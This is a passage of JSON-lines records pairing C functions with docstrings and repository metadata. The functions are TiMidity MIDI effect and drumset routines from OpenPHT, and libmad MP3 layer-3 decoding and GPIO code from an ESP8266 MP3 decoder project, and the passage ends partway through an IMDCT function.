{"docstring": "/*! free GS user instrument. */\n", "func_signal": "void free_userinst()", "code": "{\n\tUserInstrument *p, *next;\n\n\tfor(p = userinst_first; p != NULL; p = next){\n\t\tnext = p->next;\n\t\tfree(p);\n    }\n\tuserinst_first = userinst_last = NULL;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute EQ (GS) */\n", "func_signal": "void recompute_eq_status_gs(void)", "code": "{\n\tdouble freq, dbGain;\n\tstruct eq_status_gs_t *p = &eq_status_gs;\n\n\t/* Lowpass Shelving Filter */\n\tif(p->low_freq == 0) {freq = 200;}\n\telse {freq = 400;}\n\tdbGain = p->low_gain - 0x40;\n\tif(freq < play_mode->rate / 2) {\n\t\tp->lsf.q = 0;\n\t\tp->lsf.freq = freq;\n\t\tp->lsf.gain = dbGain;\n\t\tcalc_filter_shelving_low(&(p->lsf));\n\t}\n\n\t/* Highpass Shelving Filter */\n\tif(p->high_freq == 0) {freq = 3000;}\n\telse {freq = 6000;}\n\tdbGain = p->high_gain - 0x40;\n\tif(freq < play_mode->rate / 2) {\n\t\tp->hsf.q = 0;\n\t\tp->hsf.freq = freq;\n\t\tp->hsf.gain = dbGain;\n\t\tcalc_filter_shelving_high(&(p->hsf));\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute XG effect parameters. */\n", "func_signal": "void recompute_effect_xg(struct effect_xg_t *st)", "code": "{\n\tEffectList *efc = st->ef;\n\n\tif (efc == NULL) {return;}\n\twhile (efc != NULL && efc->info != NULL)\n\t{\n\t\t(*efc->engine->conv_xg)(st, efc);\n\t\t(*efc->engine->do_effect)(NULL, MAGIC_INIT_EFFECT_INFO, efc);\n\t\tefc = efc->next_ef;\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! get pointer to requested GS user drumset.\n   if it's not found, allocate a new item first. */\n", "func_signal": "UserDrumset *get_userdrum(int bank, int prog)", "code": "{\n\tUserDrumset *p;\n\n\tfor(p = userdrum_first; p != NULL; p = p->next) {\n\t\tif(p->bank == bank && p->prog == prog) {return p;}\n\t}\n\n\tp = (UserDrumset *)safe_malloc(sizeof(UserDrumset));\n\tmemset(p, 0, sizeof(UserDrumset));\n\tp->next = NULL;\n\tif(userdrum_first == NULL) {\n\t\tuserdrum_first = p;\n\t\tuserdrum_last = p;\n\t} else {\n\t\tuserdrum_last->next = p;\n\t\tuserdrum_last = p;\n\t}\n\tp->bank = bank;\n\tp->prog = prog;\n\n\treturn p;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute Reverb Effect (GS) */\n", "func_signal": "void recompute_reverb_status_gs(void)", "code": "{\n\tstruct reverb_status_gs_t *p = &reverb_status_gs;\n\n\tif(p->pre_lpf) {\n\t\tp->lpf.a = 2.0 * ((double)(7 - p->pre_lpf) / 7.0f * 16000.0f + 200.0f) / play_mode->rate;\n\t\tinit_filter_lowpass1(&(p->lpf));\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! Reverb Type (GM2) */\n", "func_signal": "void set_reverb_macro_gm2(int macro)", "code": "{\n\tstruct reverb_status_gs_t *p = &reverb_status_gs;\n\tint type = macro;\n\tif (macro == 8) {macro = 5;}\n\tmacro *= 6;\n\tp->character = reverb_macro_presets[macro];\n\tp->pre_lpf = reverb_macro_presets[macro + 1];\n\tp->level = reverb_macro_presets[macro + 2];\n\tp->time = reverb_macro_presets[macro + 3];\n\tp->delay_feedback = reverb_macro_presets[macro + 4];\n\tp->pre_delay_time = reverb_macro_presets[macro + 5];\n\n\tswitch(type) {\t/* override GS macro's parameter */\n\tcase 0:\t/* Small Room */\n\t\tp->time = 44;\n\t\tbreak;\n\tcase 1:\t/* Medium Room */\n\tcase 8:\t/* Plate */\n\t\tp->time = 50;\n\t\tbreak;\n\tcase 2:\t/* Large Room */\n\t\tp->time = 56;\n\t\tbreak;\n\tcase 3:\t/* Medium Hall */\n\tcase 4:\t/* Large Hall */\n\t\tp->time = 64;\n\t\tbreak;\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! convert GS user drumset assign groups to internal \"alternate assign\". */\n", "func_signal": "void recompute_userdrum_altassign(int bank, int group)", "code": "{\n\tint number = 0;\n\tchar *params[131], param[10];\n\tToneBank *bk;\n\tUserDrumset *p;\n\t\n\tfor(p = userdrum_first; p != NULL; p = p->next) {\n\t\tif(p->assign_group == group) {\n\t\t\tsprintf(param, \"%d\", p->prog);\n\t\t\tparams[number] = safe_strdup(param);\n\t\t\tnumber++;\n\t\t}\n\t}\n\tparams[number] = NULL;\n\n\talloc_instrument_bank(1, bank);\n\tbk = drumset[bank];\n\tbk->alt = add_altassign_string(bk->alt, params, number);\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute Multi EQ (XG) */\n", "func_signal": "void recompute_multi_eq_xg(void)", "code": "{\n\tstruct multi_eq_xg_t *p = &multi_eq_xg;\n\n\tif(p->freq1 != 0 && p->freq1 < 60 && p->gain1 != 0x40) {\n\t\tp->valid1 = 1;\n\t\tif(p->shape1) {\t/* peaking */\n\t\t\tp->eq1p.q = (double)p->q1 / 10.0;\n\t\t\tp->eq1p.freq = eq_freq_table_xg[p->freq1];\n\t\t\tp->eq1p.gain = p->gain1 - 0x40;\n\t\t\tcalc_filter_peaking(&(p->eq1p));\n\t\t} else {\t/* shelving */\n\t\t\tp->eq1s.q = (double)p->q1 / 10.0;\n\t\t\tp->eq1s.freq = eq_freq_table_xg[p->freq1];\n\t\t\tp->eq1s.gain = p->gain1 - 0x40;\n\t\t\tcalc_filter_shelving_low(&(p->eq1s));\n\t\t}\n\t} else {p->valid1 = 0;}\n\tif(p->freq2 != 0 && p->freq2 < 60 && p->gain2 != 0x40) {\n\t\tp->valid2 = 1;\n\t\tp->eq2p.q = (double)p->q2 / 10.0;\n\t\tp->eq2p.freq = eq_freq_table_xg[p->freq2];\n\t\tp->eq2p.gain = p->gain2 - 0x40;\n\t\tcalc_filter_peaking(&(p->eq2p));\n\t} else {p->valid2 = 0;}\n\tif(p->freq3 != 0 && p->freq3 < 60 && p->gain3 != 0x40) {\n\t\tp->valid3 = 1;\n\t\tp->eq3p.q = (double)p->q3 / 10.0;\n\t\tp->eq4p.freq = eq_freq_table_xg[p->freq3];\n\t\tp->eq4p.gain = p->gain3 - 0x40;\n\t\tcalc_filter_peaking(&(p->eq3p));\n\t} else {p->valid3 = 0;}\n\tif(p->freq4 != 0 && p->freq4 < 60 && p->gain4 != 0x40) {\n\t\tp->valid4 = 1;\n\t\tp->eq4p.q = (double)p->q4 / 10.0;\n\t\tp->eq4p.freq = eq_freq_table_xg[p->freq4];\n\t\tp->eq4p.gain = p->gain4 - 0x40;\n\t\tcalc_filter_peaking(&(p->eq4p));\n\t} else {p->valid4 = 0;}\n\tif(p->freq5 != 0 && p->freq5 < 60 && p->gain5 != 0x40) {\n\t\tp->valid5 = 1;\n\t\tif(p->shape5) {\t/* peaking */\n\t\t\tp->eq5p.q = (double)p->q5 / 10.0;\n\t\t\tp->eq5p.freq = eq_freq_table_xg[p->freq5];\n\t\t\tp->eq5p.gain = p->gain5 - 0x40;\n\t\t\tcalc_filter_peaking(&(p->eq5p));\n\t\t} else {\t/* shelving */\n\t\t\tp->eq5s.q = (double)p->q5 / 10.0;\n\t\t\tp->eq5s.freq = eq_freq_table_xg[p->freq5];\n\t\t\tp->eq5s.gain = p->gain5 - 0x40;\n\t\t\tcalc_filter_shelving_high(&(p->eq5s));\n\t\t}\n\t} else {p->valid5 = 0;}\n\tp->valid = p->valid1 || p->valid2 || p->valid3 || p->valid4 || p->valid5;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute GS user drumset. */\n", "func_signal": "void recompute_userdrum(int bank, int prog)", "code": "{\n\tUserDrumset *p;\n\n\tp = get_userdrum(bank, prog);\n\n\tfree_tone_bank_element(&drumset[bank]->tone[prog]);\n\tif(drumset[p->source_prog]) {\n\t\tif(drumset[p->source_prog]->tone[p->source_note].name) {\n\t\t\tcopy_tone_bank_element(&drumset[bank]->tone[prog], &drumset[p->source_prog]->tone[p->source_note]);\n\t\t\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"User Drumset (%d %d -> %d %d)\", p->source_prog, p->source_note, bank, prog);\n\t\t} else if(drumset[0]->tone[p->source_note].name) {\n\t\t\tcopy_tone_bank_element(&drumset[bank]->tone[prog], &drumset[0]->tone[p->source_note]);\n\t\t\tctl->cmsg(CMSG_INFO,VERB_NOISY,\"User Drumset (%d %d -> %d %d)\", 0, p->source_note, bank, prog);\n\t\t}\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! initialize channel layers. */\n", "func_signal": "void init_channel_layer(int ch)", "code": "{\n\tif (ch >= MAX_CHANNELS)\n\t\treturn;\n\tCLEAR_CHANNELMASK(channel[ch].channel_layer);\n\tSET_CHANNELMASK(channel[ch].channel_layer, ch);\n\tchannel[ch].port_select = ch >> 4;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! recompute Chorus Effect (GS) */\n", "func_signal": "void recompute_chorus_status_gs()", "code": "{\n\tstruct chorus_status_gs_t *p = &chorus_status_gs;\n\n\tif(p->pre_lpf) {\n\t\tp->lpf.a = 2.0 * ((double)(7 - p->pre_lpf) / 7.0f * 16000.0f + 200.0f) / play_mode->rate;\n\t\tinit_filter_lowpass1(&(p->lpf));\n\t}\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*! set Multi EQ type (XG) */\n", "func_signal": "void set_multi_eq_type_xg(int type)", "code": "{\n\tstruct multi_eq_xg_t *p = &multi_eq_xg;\n\ttype *= 20;\n\tp->gain1 = multi_eq_block_table_xg[type];\n\tp->freq1 = multi_eq_block_table_xg[type + 1];\n\tp->q1 = multi_eq_block_table_xg[type + 2];\n\tp->shape1 = multi_eq_block_table_xg[type + 3];\n\tp->gain2 = multi_eq_block_table_xg[type + 4];\n\tp->freq2 = multi_eq_block_table_xg[type + 5];\n\tp->q2 = multi_eq_block_table_xg[type + 6];\n\tp->gain3 = multi_eq_block_table_xg[type + 8];\n\tp->freq3 = multi_eq_block_table_xg[type + 9];\n\tp->q3 = multi_eq_block_table_xg[type + 10];\n\tp->gain4 = multi_eq_block_table_xg[type + 12];\n\tp->freq4 = multi_eq_block_table_xg[type + 13];\n\tp->q4 = multi_eq_block_table_xg[type + 14];\n\tp->gain5 = multi_eq_block_table_xg[type + 16];\n\tp->freq5 = multi_eq_block_table_xg[type + 17];\n\tp->q5 = multi_eq_block_table_xg[type + 18];\n\tp->shape5 = multi_eq_block_table_xg[type + 19];\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/* Print a string from the file, followed by a newline. Any non-ASCII\n   or unprintable characters will be converted to periods. */\n", "func_signal": "static char *dumpstring(int type, int32 len, char *label, int allocp,\n\t\t\tstruct timidity_file *tf)", "code": "{\n    char *si, *so;\n    int s_maxlen = SAFE_CONVERT_LENGTH(len);\n    int llen, solen;\n\n    if(len <= 0)\n    {\n\tctl->cmsg(CMSG_TEXT, VERB_VERBOSE, \"%s\", label);\n\treturn NULL;\n    }\n\n    si = (char *)new_segment(&tmpbuffer, len + 1);\n    so = (char *)new_segment(&tmpbuffer, s_maxlen);\n\n    if(len != tf_read(si, 1, len, tf))\n    {\n\treuse_mblock(&tmpbuffer);\n\treturn NULL;\n    }\n    si[len]='\\0';\n\n    if(type == 1 &&\n       current_read_track == 1 &&\n       current_file_info->format == 1 &&\n       strncmp(si, \"@KMIDI\", 6) == 0)\n\tkaraoke_format = 1;\n\n    code_convert(si, so, s_maxlen, NULL, NULL);\n\n    llen = strlen(label);\n    solen = strlen(so);\n    if(llen + solen >= MIN_MBLOCK_SIZE)\n\tso[MIN_MBLOCK_SIZE - llen - 1] = '\\0';\n\n    ctl->cmsg(CMSG_TEXT, VERB_VERBOSE, \"%s%s\", label, so);\n\n    if(allocp)\n    {\n\tso = safe_strdup(so);\n\treuse_mblock(&tmpbuffer);\n\treturn so;\n    }\n    reuse_mblock(&tmpbuffer);\n    return NULL;\n}", "path": "OpenPHT/lib/timidity/timidity/readmidi.c", "commit_date": "2011-01-24 00:00:00", "repo_name": "RasPlex/OpenPHT", "stars": 596, "license": "other", "language": "c", "size": 512143}
{"docstring": "/*\n * NAME:\tIII_reorder()\n * DESCRIPTION:\treorder frequency lines of a short block into subband order\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_reorder(mad_fixed_t xr[576], struct channel const *channel,\n\t\t unsigned char const sfbwidth[39])", "code": "{\n  mad_fixed_t tmp[32][3][6];\n  unsigned int sb, l, f, w, sbw[3], sw[3];\n\n  /* this is probably wrong for 8000 Hz mixed blocks */\n\n  sb = 0;\n  if (channel->flags & mixed_block_flag) {\n    sb = 2;\n\n    l = 0;\n    while (l < 36)\n      l += unalChar(sfbwidth++);\n  }\n\n  for (w = 0; w < 3; ++w) {\n    sbw[w] = sb;\n    sw[w]  = 0;\n  }\n\n  f = unalChar(sfbwidth++);\n  w = 0;\n\n  for (l = 18 * sb; l < 576; ++l) {\n    if (f-- == 0) {\n      f = unalChar(sfbwidth++) - 1;\n      w = (w + 1) % 3;\n    }\n\n    tmp[sbw[w]][w][sw[w]++] = xr[l];\n\n    if (sw[w] == 6) {\n      sw[w] = 0;\n      ++sbw[w];\n    }\n  }\n\n  memcpy(&xr[18 * sb], &tmp[sb], (576 - 18 * sb) * sizeof(mad_fixed_t));\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * Change GPIO pin output by setting, clearing, or disabling pins.\n * In general, it is expected that a bit will be set in at most one\n * of these masks.  If a bit is clear in all masks, the output state\n * remains unchanged.\n *\n * There is no particular ordering guaranteed; so if the order of\n * writes is significant, calling code should divide a single call\n * into multiple calls.\n */\n", "func_signal": "void ICACHE_FLASH_ATTR\ngpio_output_conf(uint32 set_mask, uint32 clear_mask, uint32 enable_mask, uint32 disable_mask)", "code": "{\n    GPIO_REG_WRITE(GPIO_OUT_W1TS_ADDRESS, set_mask);\n    GPIO_REG_WRITE(GPIO_OUT_W1TC_ADDRESS, clear_mask);\n    GPIO_REG_WRITE(GPIO_ENABLE_W1TS_ADDRESS, enable_mask);\n    GPIO_REG_WRITE(GPIO_ENABLE_W1TC_ADDRESS, disable_mask);\n}", "path": "ESP8266_MP3_DECODER/examples/driver_lib/driver/gpio.c", "commit_date": "2014-12-26 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_decode()\n * DESCRIPTION:\tdecode frame main_data\n */\n", "func_signal": "static\nenum mad_error ICACHE_FLASH_ATTR III_decode(struct mad_bitptr *ptr, struct mad_frame *frame,\n\t\t\t  struct sideinfo *si, unsigned int nch)", "code": "{\n  struct mad_header *header = &frame->header;\n  unsigned int sfreqi, ngr, gr;\n\n  {\n    unsigned int sfreq;\n\n    sfreq = header->samplerate;\n    if (header->flags & MAD_FLAG_MPEG_2_5_EXT)\n      sfreq *= 2;\n\n    /* 48000 => 0, 44100 => 1, 32000 => 2,\n       24000 => 3, 22050 => 4, 16000 => 5 */\n    sfreqi = ((sfreq >>  7) & 0x000f) +\n             ((sfreq >> 15) & 0x0001) - 8;\n\n    if (header->flags & MAD_FLAG_MPEG_2_5_EXT)\n      sfreqi += 3;\n  }\n\n  /* scalefactors, Huffman decoding, requantization */\n\n  ngr = (header->flags & MAD_FLAG_LSF_EXT) ? 1 : 2;\n\n  for (gr = 0; gr < ngr; ++gr) {\n    struct granule *granule = &si->gr[gr];\n    unsigned char const *sfbwidth[2];\n    mad_fixed_t xr[2][576];\n    unsigned int ch;\n    enum mad_error error;\n\n    for (ch = 0; ch < nch; ++ch) {\n      struct channel *channel = &granule->ch[ch];\n      unsigned int part2_length;\n\n      sfbwidth[ch] =  sfbwidth_table[sfreqi].l;\n      if (channel->block_type == 2) {\n\tsfbwidth[ch] = (channel->flags & mixed_block_flag) ?\n\t   sfbwidth_table[sfreqi].m :  sfbwidth_table[sfreqi].s;\n      }\n\n      if (header->flags & MAD_FLAG_LSF_EXT) {\n\tpart2_length = III_scalefactors_lsf(ptr, channel,\n\t\t\t\t\t    ch == 0 ? 0 : &si->gr[1].ch[1],\n\t\t\t\t\t    header->mode_extension);\n      }\n      else {\n\tpart2_length = III_scalefactors(ptr, channel, &si->gr[0].ch[ch],\n\t\t\t\t\tgr == 0 ? 0 : si->scfsi[ch]);\n      }\n\n      error = III_huffdecode(ptr, xr[ch], channel, sfbwidth[ch], part2_length);\n      if (error)\n\treturn error;\n    }\n\n    /* joint stereo processing */\n\n    if (header->mode == MAD_MODE_JOINT_STEREO && header->mode_extension) {\n      error = III_stereo(xr, granule, header, sfbwidth[0]);\n      if (error)\n\treturn error;\n    }\n\n    /* reordering, alias reduction, IMDCT, overlap-add, frequency inversion */\n\n    for (ch = 0; ch < nch; ++ch) {\n      struct channel const *channel = &granule->ch[ch];\n      mad_fixed_t (*sample)[32] = &frame->sbsample[ch][18 * gr];\n      unsigned int sb, l, i, sblimit;\n      mad_fixed_t output[36];\n\n      if (channel->block_type == 2) {\n\tIII_reorder(xr[ch], channel, sfbwidth[ch]);\n\n# if !defined(OPT_STRICT)\n\t/*\n\t * According to ISO/IEC 11172-3, \"Alias reduction is not applied for\n\t * granules with block_type == 2 (short block).\" However, other\n\t * sources suggest alias reduction should indeed be performed on the\n\t * lower two subbands of mixed blocks. Most other implementations do\n\t * this, so by default we will too.\n\t */\n\tif (channel->flags & mixed_block_flag)\n\t  III_aliasreduce(xr[ch], 36);\n# endif\n      }\n      else\n\tIII_aliasreduce(xr[ch], 576);\n\n      l = 0;\n\n      /* subbands 0-1 */\n\n      if (channel->block_type != 2 || (channel->flags & mixed_block_flag)) {\n\tunsigned int block_type;\n\n\tblock_type = channel->block_type;\n\tif (channel->flags & mixed_block_flag)\n\t  block_type = 0;\n\n\t/* long blocks */\n\tfor (sb = 0; sb < 2; ++sb, l += 18) {\n\t  III_imdct_l(&xr[ch][l], output, block_type);\n\t  III_overlap(output, (*frame->overlap)[ch][sb], sample, sb);\n\t}\n      }\n      else {\n\t/* short blocks */\n\tfor (sb = 0; sb < 2; ++sb, l += 18) {\n\t  III_imdct_s(&xr[ch][l], output);\n\t  III_overlap(output, (*frame->overlap)[ch][sb], sample, sb);\n\t}\n      }\n\n      III_freqinver(sample, 1);\n\n      /* (nonzero) subbands 2-31 */\n\n      i = 576;\n      while (i > 36 && xr[ch][i - 1] == 0)\n\t--i;\n\n      sblimit = 32 - (576 - i) / 18;\n\n      if (channel->block_type != 2) {\n\t/* long blocks */\n\tfor (sb = 2; sb < sblimit; ++sb, l += 18) {\n\t  III_imdct_l(&xr[ch][l], output, channel->block_type);\n\t  III_overlap(output, (*frame->overlap)[ch][sb], sample, sb);\n\n\t  if (sb & 1)\n\t    III_freqinver(sample, sb);\n\t}\n      }\n      else {\n\t/* short blocks */\n\tfor (sb = 2; sb < sblimit; ++sb, l += 18) {\n\t  III_imdct_s(&xr[ch][l], output);\n\t  III_overlap(output, (*frame->overlap)[ch][sb], sample, sb);\n\n\t  if (sb & 1)\n\t    III_freqinver(sample, sb);\n\t}\n      }\n\n      /* remaining (zero) subbands */\n\n      for (sb = sblimit; sb < 32; ++sb) {\n\tIII_overlap_z((*frame->overlap)[ch][sb], sample, sb);\n\n\tif (sb & 1)\n\t  III_freqinver(sample, sb);\n      }\n    }\n  }\n\n  return MAD_ERROR_NONE;\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\tIII_imdct_s()\n * DESCRIPTION:\tperform IMDCT and windowing for short blocks\n */\n", "func_signal": "static\nvoid ICACHE_FLASH_ATTR III_imdct_s(mad_fixed_t const X[18], mad_fixed_t z[36])", "code": "{\n  mad_fixed_t y[36], *yptr;\n  mad_fixed_t const *wptr;\n  int w, i;\n  register mad_fixed64hi_t hi;\n  register mad_fixed64lo_t lo;\n\n  /* IMDCT */\n\n  yptr = &y[0];\n\n  for (w = 0; w < 3; ++w) {\n    register mad_fixed_t const (*s)[6];\n\n    s = imdct_s;\n\n    for (i = 0; i < 3; ++i) {\n      MAD_F_ML0(hi, lo, X[0], (*s)[0]);\n      MAD_F_MLA(hi, lo, X[1], (*s)[1]);\n      MAD_F_MLA(hi, lo, X[2], (*s)[2]);\n      MAD_F_MLA(hi, lo, X[3], (*s)[3]);\n      MAD_F_MLA(hi, lo, X[4], (*s)[4]);\n      MAD_F_MLA(hi, lo, X[5], (*s)[5]);\n\n      yptr[i + 0] = MAD_F_MLZ(hi, lo);\n      yptr[5 - i] = -yptr[i + 0];\n\n      ++s;\n\n      MAD_F_ML0(hi, lo, X[0], (*s)[0]);\n      MAD_F_MLA(hi, lo, X[1], (*s)[1]);\n      MAD_F_MLA(hi, lo, X[2], (*s)[2]);\n      MAD_F_MLA(hi, lo, X[3], (*s)[3]);\n      MAD_F_MLA(hi, lo, X[4], (*s)[4]);\n      MAD_F_MLA(hi, lo, X[5], (*s)[5]);\n\n      yptr[ i + 6] = MAD_F_MLZ(hi, lo);\n      yptr[11 - i] = yptr[i + 6];\n\n      ++s;\n    }\n\n    yptr += 12;\n    X    += 6;\n  }\n\n  /* windowing, overlapping and concatenation */\n\n  yptr = &y[0];\n  wptr = &window_s[0];\n\n  for (i = 0; i < 6; ++i) {\n    z[i +  0] = 0;\n    z[i +  6] = mad_f_mul(yptr[ 0 + 0], wptr[0]);\n\n    MAD_F_ML0(hi, lo, yptr[ 0 + 6], wptr[6]);\n    MAD_F_MLA(hi, lo, yptr[12 + 0], wptr[0]);\n\n    z[i + 12] = MAD_F_MLZ(hi, lo);\n\n    MAD_F_ML0(hi, lo, yptr[12 + 6], wptr[6]);\n    MAD_F_MLA(hi, lo, yptr[24 + 0], wptr[0]);\n\n    z[i + 18] = MAD_F_MLZ(hi, lo);\n\n    z[i + 24] = mad_f_mul(yptr[24 + 6], wptr[6]);\n    z[i + 30] = 0;\n\n    ++yptr;\n    ++wptr;\n  }\n}", "path": "ESP8266_MP3_DECODER/mp3/mad/layer3.c", "commit_date": "2015-06-01 00:00:00", "repo_name": "espressif/ESP8266_MP3_DECODER", "stars": 743, "license": "other", "language": "c", "size": 4417}
{"docstring": "/*\n * NAME:\timdct36\n * DESCRIPTION:\tperform X[18]->x[36] IMDCT\n */\n", "func_signal": "static inline\nvoid imdct36(mad_fixed_t const X[18], mad_fixed_t x[36])", "code": "{\n  mad_fixed_t t0, t1, t2,  t3,  t4,  t5,  t6,  t7;\n  mad_fixed_t t8, t9, t10, t11, t12, t13, t14, t15;\n  register mad_fixed64hi_t hi;\n  register mad_fixed64lo_t lo;\n\n  MAD_F_ML0(hi, lo, X[4],  MAD_F(0x0ec835e8));\n  MAD_F_MLA(hi, lo, X[13], MAD_F(0x061f78aa));\n\n  t6 = MAD_F_MLZ(hi, lo);\n\n  MAD_F_MLA(hi, lo, (t14 = X[1] - X[10]), -MAD_F(0x061f78aa));\n  MAD_F_MLA(hi, lo, (t15 = X[7] + X[16]), -MAD_F(0x0ec835e8));\n\n  t0 = MAD_F_MLZ(hi, lo);\n\n  MAD_F_MLA(hi, lo, (t8  = X[0] - X[11] - X[12]),  MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, (t9  = X[2] - X[9]  - X[14]),  MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, (t10 = X[3] - X[8]  - X[15]), -MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, (t11 = X[5] - X[6]  - X[17]), -MAD_F(0x0fdcf549));\n\n  x[7]  = MAD_F_MLZ(hi, lo);\n  x[10] = -x[7];\n\n  MAD_F_ML0(hi, lo, t8,  -MAD_F(0x0cb19346));\n  MAD_F_MLA(hi, lo, t9,   MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, t10,  MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, t11, -MAD_F(0x09bd7ca0));\n\n  x[19] = x[34] = MAD_F_MLZ(hi, lo) - t0;\n\n  t12 = X[0] - X[3] + X[8] - X[11] - X[12] + X[15];\n  t13 = X[2] + X[5] - X[6] - X[9]  - X[14] - X[17];\n\n  MAD_F_ML0(hi, lo, t12, -MAD_F(0x0ec835e8));\n  MAD_F_MLA(hi, lo, t13,  MAD_F(0x061f78aa));\n\n  x[22] = x[31] = MAD_F_MLZ(hi, lo) + t0;\n\n  MAD_F_ML0(hi, lo, X[1],  -MAD_F(0x09bd7ca0));\n  MAD_F_MLA(hi, lo, X[7],   MAD_F(0x0216a2a2));\n  MAD_F_MLA(hi, lo, X[10], -MAD_F(0x0fdcf549));\n  MAD_F_MLA(hi, lo, X[16],  MAD_F(0x0cb19346));\n\n  t1 = MAD_F_MLZ(hi, lo) + t6;\n\n  MAD_F_ML0(hi, lo, X[0],   MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[5],  -MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[9],   MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[11],  MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[15], -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[17], -MAD_F(0x0f9ee890));\n\n  x[6]  = MAD_F_MLZ(hi, lo) + t1;\n  x[11] = -x[6];\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[2],  -MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[3],   MAD_F(0x0898c779));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x0acf37ad));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x0e313245));\n  MAD_F_MLA(hi, lo, X[11], -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[15],  MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[17],  MAD_F(0x04cfb0e2));\n\n  x[23] = x[30] = MAD_F_MLZ(hi, lo) + t1;\n\n  MAD_F_ML0(hi, lo, X[0],  -MAD_F(0x0bcbe352));\n  MAD_F_MLA(hi, lo, X[2],   MAD_F(0x0d7e8807));\n  MAD_F_MLA(hi, lo, X[3],  -MAD_F(0x07635284));\n  MAD_F_MLA(hi, lo, X[5],   MAD_F(0x04cfb0e2));\n  MAD_F_MLA(hi, lo, X[6],   MAD_F(0x0f9ee890));\n  MAD_F_MLA(hi, lo, X[8],  -MAD_F(0x0ffc19fd));\n  MAD_F_MLA(hi, lo, X[9],  -MAD_F(0x00b2aa3e));\n  MAD_F_MLA(hi, lo, X[11],  MAD_F(0x03768962));\n  MAD_F_MLA(hi, lo, X[12], -MAD_F(0x0f426cb5));\n  MAD_F_MLA(hi, lo, X[14],  MAD_F(0x0e313245));\n  